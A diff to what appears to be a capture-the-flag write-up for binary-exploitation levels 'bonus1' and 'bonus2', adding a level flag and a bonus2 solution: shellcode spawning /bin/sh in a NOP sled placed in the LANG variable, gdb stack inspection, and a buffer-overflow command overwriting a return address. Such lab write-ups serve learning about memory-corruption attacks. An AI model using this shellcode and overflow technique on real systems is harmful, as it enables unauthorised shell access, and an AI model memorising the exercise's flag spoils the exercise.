@@ -439,3 +439,22 @@ And if we << 2
 FLOW == 1464814662 reverse indian "WOLF"
 FLOW * 11 == 40 + 4
 ./bonus1 -2147483637  $(python -c 'print("FLOW" * 11)')
+
+`579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
+
+# bonus2
+
+nl -> DAT_08048740
+fi -> DAT_0804873d
+
+export LANG=$(python -c 'print "nl" + "\x90"*153 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+> gdb ./bonus2
+> break main
+> run
+> x/600wx $esp
+0xbffff808:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff818:	0x90909090	0x90909090	0x90909090	0x90909090 # This one
+0xbffff828:	0x90909090	0x90909090	0x90909090	0x90909090
+
+0xbffffe9c
+./bonus2 $(python -c "print 'A' * 40") $(python -c "import struct; print('B' * 23 + struct.pack('I',0xbffffe9c))")
